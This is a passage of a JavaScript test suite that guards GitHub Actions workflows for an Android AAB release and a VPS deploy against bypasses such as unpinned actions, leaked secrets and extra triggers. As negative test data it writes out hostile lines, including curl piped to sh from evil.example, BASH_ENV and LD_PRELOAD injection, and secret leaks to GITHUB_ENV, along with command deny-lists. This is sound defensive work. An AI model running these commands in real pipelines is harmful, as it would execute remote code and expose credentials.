    if (/\b(os\.environ|getenv\(|process\.env|\$\{?ENV)/.test(script)) add(`step "${step.name}" reads an environment variable from code (indirect reading closed)`);
  }
  walkYaml(doc, (key, value) => {
    if (key !== 'uses') return;
    const pin = typeof value === 'string' ? /^([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)@([0-9a-f]{40})$/.exec(value) : null;
    if (!pin || AAB_ACTIONS[pin[1]] !== pin[2] || !['actions/checkout', 'subosito/flutter-action'].includes(pin[1])) add(`uses "${String(value)}" is not an allowed action pinned by its full 40-hex SHA`);
  });
  walkYaml(doc, (key, value) => {
    if (key !== 'run' || typeof value !== 'string') return;
    for (const bad of [/\bgh\s/, /\bssh\b/, /\bscp\b/, /\brsync\b/, /\bwget\b/, /\bcurl\b/, /\bgit\s+(push|tag|remote|fetch)\b/, /scripts\/deploy/]) {
      if (bad.test(value)) add(`a run step uses a forbidden command (${bad.source})`);
    }
    // The only URL-shaped text allowed is the https-origin validation pattern (data, not a request).
    if (/https?:\/\//.test(value.replace("grep -Eq '^https://[A-Za-z0-9.-]+(:[0-9]{1,5})?/?$'", ''))) add('a run step may not contact any URL');
    for (const found of value.matchAll(/\b(mobile\/tool\/[A-Za-z0-9_.-]+|scripts\/[A-Za-z0-9_./-]+|tests\/[A-Za-z0-9_./-]+)/g)) {
      if (!IOS_SCRIPTS_OK.includes(found[1])) add(`a run step calls an unapproved script: ${found[1]}`);
    }
    for (const bad of shellScriptViolations(value)) add(bad);
  });
  walkYaml(doc, (key, value) => {
    if (key === 'shell' && value !== 'bash') add(`shell must be bash, not ${JSON.stringify(value)}`);
    if (key === 'env' && value && typeof value === 'object') {
      for (const name of Object.keys(value)) {
        if (/^(BASH_ENV|ENV|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_.*|PATH|NODE_OPTIONS|PYTHONPATH|PYTHONSTARTUP|GIT_SSH_COMMAND|BASH_FUNC_.*)$/.test(name)) add(`environment variable ${name} is not allowed in a step`);
      }
    }
  });
  for (const step of steps) {
    if (!step || typeof step !== 'object') continue;
    const stepText = JSON.stringify(step);
    for (const [, name] of stepText.matchAll(/secrets\.([A-Za-z0-9_]+)/g)) {
      if (!Object.hasOwn(IOS_SECRETS, name)) add(`secret not allowed in the release job: ${name}`);
      else if (!IOS_SECRETS[name].includes(step.name)) add(`secret ${name} outside its step`);
    }
    for (const [, name] of stepText.matchAll(/vars\.([A-Za-z0-9_]+)/g)) if (!IOS_VARS_OK.includes(name)) add(`variable not allowed in the release job: ${name}`);
  }
  return out;
}

function topologyViolations(file, text) {
  const { jobs, outside } = splitWorkflow(text);
  const out = [];
  const bad = (where, list) => list.forEach(reason => out.push(`${file}:${where} ${reason}`));
  // The one workflow-level mention allowed: deploy-vps.yml serialises runs with this concurrency group name.
  const outsideChecked = file === 'deploy-vps.yml' || file === M14_GATEWAY_FILE ? outside.replace('\n  group: vps-production-deploy\n', '\n') : outside;
  bad('(outside jobs: workflow-level env, permissions, triggers)', unsafeReferences(outsideChecked));
  // The whole secrets context is never handed over, not even in the two allowed workflows.
  if (SECRETS_CONTEXT.test(text)) out.push(`${file} passes the whole secrets context`);
  if (file === 'deploy-vps.yml') {
    if (JSON.stringify(Object.keys(jobs)) !== JSON.stringify(['ci-gate', 'deploy'])) out.push(`${file} must have exactly the jobs ci-gate, deploy (found ${Object.keys(jobs).join(', ')})`);
    if (jobs['ci-gate'] === undefined) out.push(`${file} has no ci-gate job`);
    else if (jobSha256(jobs['ci-gate']) !== CI_GATE_PINNED_SHA256) out.push(`${file}:ci-gate job changed: requires Lead + Codex re-review of the gate, then update the pinned hash`);
    if (jobs.deploy === undefined) out.push(`${file} has no deploy job`);
    else out.push(...deployJobViolations(jobs.deploy).map(reason => `${file}:deploy ${reason}`));
  } else if (file === M14_GATEWAY_FILE) {
    if (JSON.stringify(Object.keys(jobs)) !== JSON.stringify(['ci-gate', 'gateway'])) out.push(`${file} must have exactly the jobs ci-gate, gateway (found ${Object.keys(jobs).join(', ')})`);
    if (jobs['ci-gate'] === undefined || jobSha256(jobs['ci-gate']) !== CI_GATE_PINNED_SHA256) out.push(`${file}:ci-gate job changed: requires Lead + Codex re-review of the gate, then update the pinned hash`);
    if (jobs.gateway === undefined) out.push(`${file} has no gateway job`);
    else {
      out.push(...deployJobViolations(jobs.gateway).map(reason => `${file}:gateway ${reason}`));
      if (jobSha256(jobs.gateway) !== M14_GATEWAY_JOB_PINNED_SHA256) out.push(`${file}:gateway job changed: requires Lead + Codex re-review, then update the pinned hash`);
    }
  } else if (file === 'diagnose-vps-release.yml') {
    if (JSON.stringify(Object.keys(jobs)) !== JSON.stringify(['diagnose'])) out.push(`${file} must have exactly the job diagnose (found ${Object.keys(jobs).join(', ')})`);
    const allow = READ_ONLY_ALLOWLIST[file];
    if (jobs.diagnose !== undefined) { try { assertPinnedReadOnly(file, 'diagnose', jobs.diagnose, allow); } catch (error) { out.push(error.message); } }
  } else if (file === AAB_RELEASE.file) {
    out.push(...aabReleaseViolations(text, jobs));
  } else if (file === IOS_RELEASE.file) {
    out.push(...iosReleaseViolations(text), ...unsafeReferences(jobs[IOS_RELEASE.job] ?? '').map(r => `${IOS_RELEASE.file}:${IOS_RELEASE.job} ${r}`));
  } else {
    for (const [name, block] of Object.entries(jobs)) {
      bad(name, unsafeReferences(block));
      // No environment at all outside the two allowed jobs (also catches dynamic names like ${{ inputs.x }}).
      if (jobProps(block).environment !== undefined) out.push(`${file}:${name} declares an environment (only deploy-vps.yml:deploy, deploy-m14-gateway.yml:gateway and diagnose-vps-release.yml:diagnose may)`);
    }
  }
  return out;
}

// ---- AAB release exception: the one accepted pair, and every variant that must fail ----------------
const AAB_FILE = 'mobile-aab-release.yml';
const aabReal = () => readFileSync(join(WORKFLOWS, AAB_FILE), 'utf8').replace(/\r\n/g, '\n');
const aabMutate = (from, to) => {
  const text = aabReal();
  assert.ok(text.includes(from), `mutation anchor exists: ${JSON.stringify(from)}`);
  return text.replace(from, to);
};
// A parser that refuses the text (fail-closed throw) also counts as the guard catching it.
const failsWith = (file, text, pattern) => {
  let v;
  try { v = topologyViolations(file, text); } catch (error) { v = [String(error.message)]; }
  assert.ok(v.length > 0, `expected a violation for ${file}`);
  assert.ok(v.some(x => pattern.test(x)), `expected ${pattern} in ${JSON.stringify(v)}`);
};

test('AAB exception: the exact pair (mobile-aab-release.yml:aab, android-release, main, dispatch only) passes', () => {
  assert.deepEqual(topologyViolations(AAB_FILE, aabReal()), []);
});

test('AAB exception: any other file name keeps the old rule (environment forbidden)', () => {
  for (const name of ['mobile-aab-release.yaml', 'mobile-aab-release-copy.yml', 'Mobile-AAB-Release.yml', 'mobile-aab.yml']) {
    failsWith(name, aabReal(), /declares an environment/);
  }
});

test('AAB exception: a renamed or extra job, or a second job with the environment, fails', () => {
  failsWith(AAB_FILE, aabMutate('\n  aab:\n', '\n  release:\n'), /must have exactly the job aab/);
  // a second job that also declares the environment, even when the first one is correct
  failsWith(AAB_FILE, aabReal() + '\n  second:\n    runs-on: ubuntu-24.04\n    environment: android-release\n    steps:\n      - run: echo hi\n', /must have exactly the job aab|exactly one environment/);
});

test('AAB exception: a different environment name fails, however it is spelled', () => {
  for (const env of ['vps-production', 'android-release-x', 'Android-Release', '"android-release"', "'android-release'", 'ANDROID-RELEASE']) {
    failsWith(AAB_FILE, aabMutate('environment: android-release', `environment: ${env}`), /environment must be exactly android-release|vps-production/);
  }
});

test('AAB exception: any trigger besides workflow_dispatch fails (push, pull_request, schedule, flow style)', () => {
  for (const trig of ['push', 'pull_request', 'pull_request_target', 'schedule', 'workflow_call', 'release', 'repository_dispatch']) {
    failsWith(AAB_FILE, aabMutate('on:\n  workflow_dispatch:', `on:\n  ${trig}:\n  workflow_dispatch:`), /only trigger is workflow_dispatch/);
  }
  failsWith(AAB_FILE, aabMutate('on:\n  workflow_dispatch:', 'on: [push, workflow_dispatch]'), /only trigger is workflow_dispatch/);
  failsWith(AAB_FILE, aabMutate('on:\n  workflow_dispatch:', 'on: workflow_dispatch'), /only trigger is workflow_dispatch/);
});

test('AAB exception: the main-branch restriction must be in the job itself, not only in a step', () => {
  failsWith(AAB_FILE, aabMutate("    if: github.ref == 'refs/heads/main'\n", ''), /restricted to github\.ref == 'refs\/heads\/main'/);
  failsWith(AAB_FILE, aabMutate("    if: github.ref == 'refs/heads/main'", "    if: github.ref != ''"), /restricted to/);
  failsWith(AAB_FILE, aabMutate("    if: github.ref == 'refs/heads/main'", "    if: always() && github.ref == 'refs/heads/main'"), /restricted to/);
  // the step guard is the second layer: removing it fails too
  failsWith(AAB_FILE, aabMutate('if [ "$GITHUB_REF" != "refs/heads/main" ]; then', 'if false; then'), /refuse any ref other than main/);
});

test('AAB exception: runner must be the GitHub-hosted ubuntu image, never a self-hosted (VPS) runner', () => {
  failsWith(AAB_FILE, aabMutate('runs-on: ubuntu-24.04', 'runs-on: [self-hosted, M00-VPS-01]'), /runs-on must be ubuntu-24\.04|self-hosted|VPS/);
  failsWith(AAB_FILE, aabMutate('runs-on: ubuntu-24.04', 'runs-on: ${{ inputs.app }}'), /runs-on must be/);
});

test('AAB exception: a reusable workflow call or any extra job key (uses, secrets, needs, with) fails', () => {
  failsWith(AAB_FILE, aabMutate('    environment: android-release\n', '    environment: android-release\n    uses: ./.github/workflows/deploy-vps.yml\n'), /job keys outside the allowlist.*uses|deploy-vps/);
  failsWith(AAB_FILE, aabMutate('    environment: android-release\n', '    environment: android-release\n    secrets: inherit\n'), /job keys outside the allowlist|secrets: inherit/);
  failsWith(AAB_FILE, aabMutate('    environment: android-release\n', '    environment: android-release\n    needs: [deploy]\n'), /job keys outside the allowlist/);
});

test('AAB exception: YAML anchors, aliases and merge keys cannot reuse or hide a value', () => {
  failsWith(AAB_FILE, aabMutate('environment: android-release', 'environment: &e android-release'), /anchors, aliases/);
  failsWith(AAB_FILE, aabMutate('runs-on: ubuntu-24.04', 'runs-on: *e'), /anchors, aliases/);
  failsWith(AAB_FILE, aabMutate('    steps:\n', '    <<: {environment: vps-production}\n    steps:\n'), /anchors, aliases|vps-production/);
});

test('AAB exception: a second YAML document cannot add a job or an environment', () => {
  failsWith(AAB_FILE, aabReal() + '\n---\njobs:\n  deploy:\n    environment: vps-production\n', /single YAML document|vps-production|jobs/);
});

test('AAB exception: no VPS, SSH, deploy-script, workflow-call or secrets-context reference anywhere in the file', () => {
  const inserts = [
    ['      - run: ssh deploy@host true\n', /mentions "\bssh\b"/],
    ['      - run: scp file deploy@host:/x\n', /mentions/],
    ['      - run: rsync -a . host:/x\n', /mentions/],
    ['      - env:\n          X: ${{ secrets.VPS_SSH_KEY }}\n        run: true\n', /mentions "VPS_"/i],
    ['      - run: node scripts/deploy/vps-update.mjs\n', /calls scripts\/deploy\/vps-update/],
    ['      - run: node scripts/deploy/check-app-compat.mjs --live\n', /check-app-compat\.mjs without exactly --static/],
    ['      - run: gh workflow run deploy-vps.yml\n', /must not trigger or call another workflow/],
    ['      - run: gh api repos/x/y/actions/workflows\n', /must not trigger or call another workflow/],
    ['      - uses: ./.github/actions/deploy\n', /mentions/],
    ['      - env: ${{ toJSON(secrets) }}\n        run: true\n', /passes the whole secrets context/],
  ];
  for (const [line, pattern] of inserts) {
    const text = aabReal().replace('\n    steps:\n', `\n    steps:\n${line}`);
    assert.notEqual(text, aabReal(), 'insertion point exists');
    failsWith(AAB_FILE, text, pattern);
  }
});

test('AAB exception: a write permission or a workflow_run/repository_dispatch trigger cannot be added quietly', () => {
  failsWith(AAB_FILE, aabMutate('permissions:\n  contents: read', 'permissions:\n  contents: write'), /no write permission/);
  failsWith(AAB_FILE, aabMutate('permissions:\n  contents: read', 'permissions: write-all'), /no write permission/);
  failsWith(AAB_FILE, aabMutate('on:\n  workflow_dispatch:', 'on:\n  workflow_run:\n    workflows: [Mobile APK]\n  workflow_dispatch:'), /only trigger is workflow_dispatch/);
});

test('AAB exception: every action is pinned by its full 40-hex SHA from the allowlist (tags, branches, short SHAs, new or local actions all fail)', () => {
  const checkout = 'actions/checkout@11d5960a326750d5838078e36cf38b85af677262';
  // the real file: every uses line is allowed (positive)
  assert.deepEqual(topologyViolations(AAB_FILE, aabReal()), []);
  const bad = [
    ['tag', 'actions/checkout@v4'],
    ['branch', 'actions/checkout@main'],
    ['short sha', 'actions/checkout@11d5960'],
    ['sha of a different commit for the same action', 'actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955'],
    ['a new third-party action, pinned or not', 'some-org/cache@0123456789abcdef0123456789abcdef01234567'],
    ['a new action by tag', 'softprops/action-gh-release@v2'],
    ['docker reference', 'docker://alpine:3.20'],
    ['local action', './.github/actions/deploy'],
    ['upper-case SHA', 'actions/checkout@11D5960A326750D5838078E36CF38B85AF677262'],
  ];
  for (const [, value] of bad) {
    failsWith(AAB_FILE, aabMutate(`uses: ${checkout}`, `uses: ${value}`), /is not an allowed action pinned by its full 40-hex SHA/);
  }
  // a step added at the job level or in a list, with a new action, is refused too
  failsWith(AAB_FILE, aabReal().replace('\n    steps:\n', '\n    steps:\n      - uses: actions/cache@0123456789abcdef0123456789abcdef01234567\n'), /is not an allowed action/);
  // a reusable-workflow call at job level with a SHA-pinned path is still refused (not an allowed action, and not a job key)
  failsWith(AAB_FILE, aabMutate('    environment: android-release\n', `    environment: android-release\n    uses: ${checkout}\n`), /job keys outside the allowlist|is not an allowed action/);
});

// Inserts text as the first step(s) of the real job (the parsed tree, not the line text, decides).
const withSteps = extra => aabReal().replace('\n    steps:\n', `\n    steps:\n${extra}`);
const EVIL = 'evil/action@v1';

test('AAB guard (structural): flow-style steps with an unknown uses fail, one line or several (Antigravity, PR #351)', () => {
  failsWith(AAB_FILE, withSteps(`      - { uses: ${EVIL} }\n`), /flow-style|is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - { name: x, uses: ${EVIL} }\n`), /flow-style|is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - {\n          name: x,\n          uses: ${EVIL} }\n`), /flow-style|is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - { "uses": ${EVIL} }\n`), /flow-style|is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - [ { uses: ${EVIL} } ]\n`), /flow-style|is not an allowed action/);
  // a whole flow sequence in place of the steps block
  failsWith(AAB_FILE, aabMutate('    steps:\n', `    steps: [ { uses: ${EVIL} } ]\n    unused:\n`), /flow-style|is not an allowed action|job key outside|cannot be parsed/);
});

test('AAB guard (structural): quoted keys, nested uses and any other block form cannot hide an unknown action', () => {
  failsWith(AAB_FILE, withSteps(`      - "uses": ${EVIL}\n`), /is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - 'uses': ${EVIL}\n`), /is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        with:\n          uses: ${EVIL}\n`), /is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        env:\n          uses: ${EVIL}\n`), /is not an allowed action|env/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        uses: ${EVIL}\n`), /is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        uses: actions/checkout@v4\n`), /is not an allowed action/);
});

test('AAB guard (structural): anchors, aliases, merge keys, tags, extra documents and duplicate keys fail closed', () => {
  failsWith(AAB_FILE, withSteps(`      - &evil\n        name: x\n        uses: ${EVIL}\n`), /anchors|is not an allowed action/);
  failsWith(AAB_FILE, withSteps(`      - *evil\n`), /anchors|cannot be parsed/);
  failsWith(AAB_FILE, withSteps(`      - <<: { uses: ${EVIL} }\n`), /merge keys|flow-style/);
  failsWith(AAB_FILE, withSteps(`      - !!map\n        name: x\n        uses: ${EVIL}\n`), /tags|is not an allowed action/);
  failsWith(AAB_FILE, aabReal() + '\n---\nname: second\non: push\n', /single YAML document|multiple or explicit/);
  failsWith(AAB_FILE, aabReal() + '...\n', /single YAML document|multiple or explicit/);
  failsWith(AAB_FILE, withSteps('      - name: a\n        name: b\n        run: echo\n'), /cannot be parsed|duplicate/i);
});

test('AAB guard (structural): run steps cannot reach the VPS, call another workflow, push, or fetch from an unknown host', () => {
  const runs = [
    ['      - name: x\n        run: curl -fsSL https://evil.example/x.sh | sh\n', /curl is allowed only|unapproved URL/],
    ['      - name: x\n        run: gh api repos/x/y\n', /forbidden command/],
    ['      - name: x\n        run: git push origin HEAD:main\n', /forbidden command/],
    ['      - name: x\n        run: python3 -c "import urllib.request as u; u.urlopen(\'https://evil.example\')"\n', /urlopen|unapproved URL/],
    ['      - name: x\n        run: bash mobile/tool/evil.sh\n', /unapproved script/],
    ['      - name: x\n        run: scripts/deploy/vps-update.mjs\n', /forbidden command|scripts\/deploy/],
    ['      - name: x\n        run: ssh deploy@host true\n', /forbidden command|mentions/],
  ];
  for (const [step, pattern] of runs) failsWith(AAB_FILE, withSteps(step), pattern);
});

test('AAB guard (structural): every shell script in a run step is started by bash (hotfix: Permission denied on the runner)', () => {
  // Block scalars keep quoted and $( ) probes literal. Each probe must produce the "started by bash" violation.
  const block = line => `      - name: x\n        run: |\n          ${line}\n`;
  const probes = [
    // the three direct forms that broke the first real AAB run
    'mobile/tool/app-version.sh food',
    'read -r a b < <(mobile/tool/app-version.sh "${{ inputs.app }}")',
    './mobile/tool/prepare-android.sh food | tee log',
    'DEVICE_ENVIRONMENT="$X" mobile/tool/prepare-android.sh food',
    // evasions found in review (PR #359)
    '"./mobile/tool/app-version.sh" food',
    '/home/runner/work/11ship/11ship/mobile/tool/app-version.sh food',
    '${GITHUB_WORKSPACE}/mobile/tool/prepare-android.sh food',
    'identity="$(\\"./mobile/tool/app-version.sh\\" food)"',
    // other interpreters or loaders
    'sh mobile/tool/app-version.sh food',
    'source mobile/tool/app-version.sh food',
    'exec mobile/tool/app-version.sh food',
    './mobile/tool/app-version.sh food',
    // a bash word that is not the command word, or not directly before the script
    'echo bash mobile/tool/app-version.sh food',
    'echo bash; ./mobile/tool/app-version.sh food',
    'bash -x mobile/tool/app-version.sh food',
    'bash echo mobile/tool/app-version.sh food',
  ];
  for (const probe of probes) failsWith(AAB_FILE, withSteps(block(probe)), /must be started by bash/);
  // Accepted forms: bash as the command word (optionally after NAME=value), with the script as its first argument.
  const accepted = [
    'bash mobile/tool/app-version.sh food',
    'DEVICE_ENVIRONMENT="$X" bash mobile/tool/prepare-android.sh food | tee log',
    'identity="$(bash mobile/tool/app-version.sh food)"',
    'read -r a <<< "$(bash mobile/tool/app-version.sh "${{ inputs.app }}")"',
  ];
  for (const line of accepted) {
    const found = topologyViolations(AAB_FILE, withSteps(block(line))).filter(v => /started by bash/.test(v));
    assert.deepEqual(found, [], `accepted form must pass: ${line}`);
  }
  assert.deepEqual(topologyViolations(AAB_FILE, aabReal()).filter(v => /started by bash/.test(v)), [], 'the real workflow passes');
});

test('AAB guard (structural): secrets stay where they belong (upload keys only in the signing step; no other secret)', () => {
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo ${{ secrets.ANDROID_UPLOAD_KEYSTORE_BASE64 }}\n'), /upload-key secret outside the signing step/);
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo ${{ secrets.VPS_SSH_KEY }}\n'), /secret not allowed/);
  failsWith(AAB_FILE, withSteps('      - name: other\n        env:\n          X: ${{ secrets.GITHUB_TOKEN }}\n        run: true\n'), /secret not allowed/);
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo ${{ vars.VPS_HOST }}\n'), /variable not allowed/);
});

test('AAB guard (structural): a custom shell, an injected interpreter variable or a loader variable fails', () => {
  failsWith(AAB_FILE, withSteps(`      - name: x\n        shell: "sh -c 'curl https://evil.example | sh' {0}"\n        run: true\n`), /shell must be bash/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        env:\n          BASH_ENV: /tmp/evil.sh\n        run: true\n`), /BASH_ENV is not allowed/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        env:\n          PATH: /tmp/evil:/usr/bin\n        run: true\n`), /PATH is not allowed/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        run: LD_PRELOAD=/tmp/evil.so true\n`), /interpreter or loader variable/);
  failsWith(AAB_FILE, withSteps(`      - name: x\n        run: echo "NODE_OPTIONS=--require /tmp/x" >> "$GITHUB_ENV"\n`), /interpreter or loader variable/);
});

// ---- golden shape (Codex, PR #351): every listed change must fail ----
const SIGN_LINE = 'bash mobile/tool/sign-aab.sh "$RUNNER_TEMP/unsigned.aab"';
const RECORD_IMPORT = 'import hashlib, json, sys, xml.etree.ElementTree as ET';
const VERIFY_HEAD = '      - name: Verify the signature (one signer) and the merged manifest\n';
const SIGN_HEAD = '      - name: Sign the bundle with the upload key (single signer)\n';
const RECORD_HEAD = '      - name: Write the release record (public values only)\n';
const UPLOAD_HEAD = '      - name: Upload the signed bundle and its release record\n';
const GOLDEN_VIOLATION = /approved golden|GITHUB_ENV|continue-on-error|key outside the allowlist|reads an environment variable|GITHUB_OUTPUT|GITHUB_STEP_SUMMARY/;

test('golden: the golden signing text hashes to the golden run hash, so the reviewed text and the compared hash cannot drift apart', () => {
  const signGolden = AAB_GOLDEN.steps.find(s => s.name === AAB_SIGN_STEP);
  assert.ok(signGolden, 'the golden has the signing step');
  assert.equal(signGolden.run, 'sha256:' + createHash('sha256').update(AAB_GOLDEN.signRun).digest('hex'));
  assert.deepEqual(canonicalSteps(yaml.load(aabReal()).jobs.aab.steps), AAB_GOLDEN.steps, 'the workflow matches the golden');
});

test('golden (a): the signing step writes a secret into GITHUB_ENV -> FAIL', () => {
  failsWith(AAB_FILE, aabMutate(SIGN_LINE, `echo "LEAK=$ANDROID_UPLOAD_KEYSTORE_BASE64" >> "$GITHUB_ENV"\n          ${SIGN_LINE}`), GOLDEN_VIOLATION);
});

test('golden (b): the record step reads an environment variable indirectly -> FAIL', () => {
  failsWith(AAB_FILE, aabMutate(RECORD_IMPORT, `${RECORD_IMPORT}\n          import os; _k = os.environ.get('ANDROID_UPLOAD_KEYSTORE_PASSWORD')`), GOLDEN_VIOLATION);
});

test('golden (c): continue-on-error or if on the verify, sign, record or upload step -> FAIL', () => {
  for (const head of [VERIFY_HEAD, SIGN_HEAD, RECORD_HEAD, UPLOAD_HEAD]) {
    failsWith(AAB_FILE, aabMutate(head, `${head}        continue-on-error: true\n`), GOLDEN_VIOLATION);
    failsWith(AAB_FILE, aabMutate(head, `${head}        if: always()\n`), GOLDEN_VIOLATION);
  }
  failsWith(AAB_FILE, aabMutate(SIGN_HEAD, `${SIGN_HEAD}        id: sign\n`), GOLDEN_VIOLATION);
});

test('golden (d): any change to the signing script fails', () => {
  failsWith(AAB_FILE, aabMutate(SIGN_LINE, `${SIGN_LINE} --verbose`), GOLDEN_VIOLATION);
  failsWith(AAB_FILE, aabMutate('mkdir -p "$RUNNER_TEMP/release"', 'mkdir -p "$RUNNER_TEMP/release" && echo hi'), GOLDEN_VIOLATION);
});

test('golden (e): adding, deleting or reordering a step fails', () => {
  const dump = d => yaml.dump(d, { lineWidth: -1 });
  // added
  const added = yaml.load(aabReal());
  added.jobs.aab.steps.push({ name: 'Extra', run: 'echo extra' });
  failsWith(AAB_FILE, dump(added), GOLDEN_VIOLATION);
  // deleted
  const deleted = yaml.load(aabReal());
  deleted.jobs.aab.steps.splice(9, 1);
  failsWith(AAB_FILE, dump(deleted), GOLDEN_VIOLATION);
  // reordered (verify and record swapped)
  const reordered = yaml.load(aabReal());
  const [a, b] = [reordered.jobs.aab.steps[14], reordered.jobs.aab.steps[15]];
  reordered.jobs.aab.steps[14] = b; reordered.jobs.aab.steps[15] = a;
  failsWith(AAB_FILE, dump(reordered), GOLDEN_VIOLATION);
});

test('golden (f): changing the upload path fails', () => {
  failsWith(AAB_FILE, aabMutate('${{ runner.temp }}/release/${{ env.ARTIFACT_BASENAME }}-release.json', '${{ runner.temp }}/release/other.json'), GOLDEN_VIOLATION);
  failsWith(AAB_FILE, aabMutate('          name: ${{ env.ARTIFACT_BASENAME }}-aab', '          name: ${{ env.ARTIFACT_BASENAME }}-aab-2'), GOLDEN_VIOLATION);
});

test('golden (extra): the step summary, the output channel, a path channel, or an injected os.environ in any step fails', () => {
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo x >> "$GITHUB_STEP_SUMMARY"\n'), GOLDEN_VIOLATION);
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo x=1 >> "$GITHUB_OUTPUT"\n'), GOLDEN_VIOLATION);
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: echo /x >> "$GITHUB_PATH"\n'), GOLDEN_VIOLATION);
  failsWith(AAB_FILE, withSteps('      - name: other\n        run: python3 -c "import os; print(os.environ)"\n'), GOLDEN_VIOLATION);
});

test('the valid workflow still passes every structural check', () => {
  assert.deepEqual(topologyViolations(AAB_FILE, aabReal()), []);
});

test('AAB exception: the exception is keyed to the file; the same pair under another job id in another file never passes', () => {
  // the same job text placed in a different workflow file is an ordinary workflow: the environment is forbidden there
  failsWith('mobile-apk.yml', aabReal(), /declares an environment/);
});

test('closed topology: only deploy-vps.yml:deploy and diagnose-vps-release.yml:diagnose reach the VPS; deploy is gated; every other workflow is clean', () => {
  const files = readdirSync(WORKFLOWS).filter(f => /\.ya?ml$/.test(f));
  assert.ok(files.includes('deploy-vps.yml') && files.includes('diagnose-vps-release.yml') && files.includes(M14_GATEWAY_FILE));
  for (const file of files) assert.deepEqual(topologyViolations(file, readFileSync(join(WORKFLOWS, file), 'utf8')), [], file);
  // The three allowed scripts never reach the VPS (check-app-compat only over HTTPS, and only --static is exempt).
  for (const name of SAFE_NODE_SCRIPTS) assert.doesNotMatch(readFileSync(join(ROOT, 'scripts/deploy', name), 'utf8'), /vps_|\bssh\b|\bscp\b|\brsync\b|\bsftp\b/i, name);
  // No local composite actions / reusable workflows exist that could hide a VPS call.
  assert.ok(!readdirSync(join(ROOT, '.github')).includes('actions'), '.github/actions must not exist');
});

test('topology negatives (in memory): every bypass scenario fails', () => {
  const deploy = readFileSync(join(WORKFLOWS, 'deploy-vps.yml'), 'utf8').replace(/\r\n/g, '\n');
  const other = readFileSync(join(WORKFLOWS, 'ci.yml'), 'utf8').replace(/\r\n/g, '\n');
  assert.deepEqual(topologyViolations('deploy-vps.yml', deploy), []);
  assert.deepEqual(topologyViolations('ci.yml', other), []);
  const mustChange = (text, from, to) => { assert.ok(text.includes(from), 'mutation anchor: ' + from); return text.replace(from, to); };
  const wf = job => 'name: x\non: workflow_dispatch\njobs:\n' + job;
  const sneaky = run => wf('  sneaky:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: ' + run + '\n');
  const expectFail = (file, text, pattern, label) => {
    const v = topologyViolations(file, text);
    assert.ok(v.length > 0 && v.some(line => pattern.test(line)), `${label}: expected ${pattern}, got ${JSON.stringify(v)}`);
  };

  // 1. "needs: ci-gate" only nested inside a step env: not a job-level needs.
  const noJobNeeds = mustChange(deploy, '  deploy:\n    needs: ci-gate\n', '  deploy:\n') + '      - run: echo\n        env:\n          needs: ci-gate\n';
  assert.deepEqual(Object.keys(splitWorkflow(deploy).jobs), ['ci-gate', 'deploy'], 'deploy is the last job');
  expectFail('deploy-vps.yml', noJobNeeds, /job-level needs containing ci-gate/, 'nested needs');
  // 2. A fake ci-gate job that does not run the real gate.
  expectFail('deploy-vps.yml', mustChange(deploy, 'run: node scripts/deploy/ci-gate.mjs "$DEPLOY_SHA"', 'run: echo ok'), /ci-gate job changed/, 'fake ci-gate');
  // 3. deploy job-level if that survives a failed gate.
  for (const cond of ['always()', 'failure()', 'cancelled()', '!cancelled()', 'Always()', 'FAILURE()', 'Cancelled()', '!CANCELLED()', 'ALWAYS ()', "github.ref == 'refs/heads/main' || always()"]) {
    expectFail('deploy-vps.yml', mustChange(deploy, "  deploy:\n    needs: ci-gate\n    if: github.ref == 'refs/heads/main'", `  deploy:\n    needs: ci-gate\n    if: ${cond}`), /must not use always/, cond);
  }
  // 4. The SSH key at workflow level, in deploy-vps.yml itself and in another workflow.
  expectFail('deploy-vps.yml', mustChange(deploy, '\npermissions:', '\nenv:\n  K: ${{ secrets.VPS_SSH_PRIVATE_KEY }}\npermissions:'), /outside jobs/, 'workflow-level key in deploy-vps');
  expectFail('evil.yml', 'name: x\non: push\nenv:\n  K: ${{ secrets.VPS_SSH_PRIVATE_KEY }}\njobs:\n  a:\n    runs-on: x\n    steps:\n      - run: echo\n', /outside jobs/, 'workflow-level key elsewhere');
  expectFail('evil.yml', sneaky('echo hi\n        env:\n          K: ${{ secrets.VPS_SSH_PRIVATE_KEY }}'), /sneaky/, 'key in another workflow job');
  // 5. The deploy script run from another workflow.
  expectFail('evil.yml', sneaky('bash scripts/deploy/github-vps-deploy.sh'), /sneaky/, 'bash deploy script');
  expectFail('evil.yml', sneaky('python3 scripts/deploy/vps-update.py apply'), /not an allowed/, 'vps-update');
  expectFail('evil.yml', sneaky('node ./scripts/deploy/check-app-compat.mjs'), /not an allowed/, 'relative node path');
  expectFail('evil.yml', sneaky('cd scripts/deploy && ./github-vps-deploy.sh'), /sneaky/, 'cd into scripts/deploy');
  // 6. ssh by absolute path, scp/rsync/sftp.
  for (const run of ['/usr/bin/ssh root@host reboot', 'ssh root@host', 'scp x root@host:/y', 'rsync -a x root@host:/y', 'sftp root@host']) expectFail('evil.yml', sneaky(run), /sneaky/, run);
  // 7. secrets: inherit and local reusable workflows / composite actions.
  expectFail('evil.yml', wf('  call:\n    uses: org/repo/.github/workflows/x.yml@v1\n    secrets: inherit\n'), /secrets:\s*inherit/, 'secrets inherit');
  expectFail('evil.yml', wf('  call:\n    uses: ./.github/workflows/deploy-vps.yml\n'), /uses:\s*\.\//, 'local reusable workflow');
